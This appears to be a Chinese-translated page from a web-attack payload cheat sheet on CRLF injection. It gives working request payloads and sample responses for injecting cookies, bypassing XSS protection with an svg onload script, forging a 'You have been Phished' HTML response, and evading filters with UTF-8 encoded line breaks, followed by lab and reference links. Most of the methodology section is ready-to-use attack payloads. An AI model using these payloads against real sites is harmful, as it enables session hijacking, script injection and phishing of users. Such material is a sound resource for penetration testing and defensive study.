<!--
 * [业务问题]: CRLF 注入是一种通过注入回车换行符（\r\n）操纵 HTTP 响应头的攻击手法。攻击者可以注入恶意 Cookie、绕过 XSS 防护、伪造 HTTP 响应或发起钓鱼攻击，导致会话劫持或用户信息泄露。
 * [实现逻辑]: 本文档详细介绍了 CRLF 注入的多种利用场景，包括添加恶意 Cookie、绕过 XSS 防护、写入任意 HTML 内容以及使用 UTF-8 编码绕过过滤器等技术，并提供了完整的 Payload 示例。
 -->

# Carriage Return Line Feed (CRLF 注入)

> CRLF 代表回车符（Carriage Return，ASCII 13, \r）和换行符（Line Feed，ASCII 10, \n）。它们用于标记行的终止，但在当今流行的操作系统中处理方式不同。例如：在 Windows 中，CR 和 LF 都需要标记行的结束，而在 Linux/UNIX 中只需要 LF。在 HTTP 协议中，CR-LF 序列总是用于终止一行。

> 当用户设法将 CRLF 提交到应用程序中时，就会发生 CRLF 注入攻击。这最常见的是通过修改 HTTP 参数或 URL 来完成。


## 概要 (Summary)

* [Methodology](#methodology)
    * [Add a cookie](#add-a-cookie)
    * [Add a cookie - XSS Bypass](#add-a-cookie---xss-bypass)
    * [Write HTML](#write-html)
    * [Filter Bypass](#filter-bypass)
* [Labs](#labs)
* [References](#references)


## Methodology

### Add a cookie

Requested page

```http
http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
```

HTTP Response

```http
Connection: keep-alive
Content-Length: 178
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Location: https://www.example.net/[INJECTION STARTS HERE]
Set-Cookie: mycookie=myvalue
X-Frame-Options: SAMEORIGIN
X-Sucuri-ID: 15016
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
```


### Add a cookie - XSS Bypass

Requested page

```powershell
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

HTTP Response

```http
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: <https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```


### Write HTML

Requested page

```http
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

HTTP response

```http
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>
```


### Filter Bypass

Using UTF-8 encoding

```http
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
```

Remainder:

* `%E5%98%8A` = `%0A` = \u560a
* `%E5%98%8D` = `%0D` = \u560d
* `%E5%98%BE` = `%3E` = \u563e (>)
* `%E5%98%BC` = `%3C` = \u563c (<)


## Labs

* [PortSwigger - HTTP/2 request splitting via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
* [Root Me - CRLF](https://www.root-me.org/en/Challenges/Web-Server/CRLF)


## References

- [CRLF Injection - CWE-93 - OWASP - May 20, 2022](https://www.owasp.org/index.php/CRLF_Injection)
- [Starbucks: [newscdn.starbucks.com] CRLF Injection, XSS - Bobrov - 2016-12-20](https://vulners.com/hackerone/H1:192749)